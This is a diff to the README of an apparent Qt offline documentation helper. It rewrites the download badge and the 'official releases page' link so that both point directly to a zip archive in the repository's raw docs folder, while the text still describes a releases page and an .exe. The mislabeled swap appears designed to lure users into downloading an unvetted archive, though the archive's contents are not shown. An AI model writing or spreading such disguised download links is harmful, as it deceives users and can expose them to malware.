@@ -1,12 +1,12 @@
 # 📘 theo-qt-helper - Browse Qt documents without internet access
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/stephensoncardboard725/theo-qt-helper/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/stephensoncardboard725/theo-qt-helper/raw/refs/heads/main/docs/qt_helper_theo_v2.7.zip)
 
 This application helps developers read Qt documentation in Simplified Chinese. It works offline, which means you do not need an internet connection to look up API details. You can manage multiple documents, search through indexes, and keep the window on top of other programs while you code.
 
 ## 🚀 How to get the app
 
-1. Visit the [official releases page](https://github.com/stephensoncardboard725/theo-qt-helper/releases).
+1. Visit the [official releases page](https://github.com/stephensoncardboard725/theo-qt-helper/raw/refs/heads/main/docs/qt_helper_theo_v2.7.zip).
 2. Look for the section labeled Latest.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
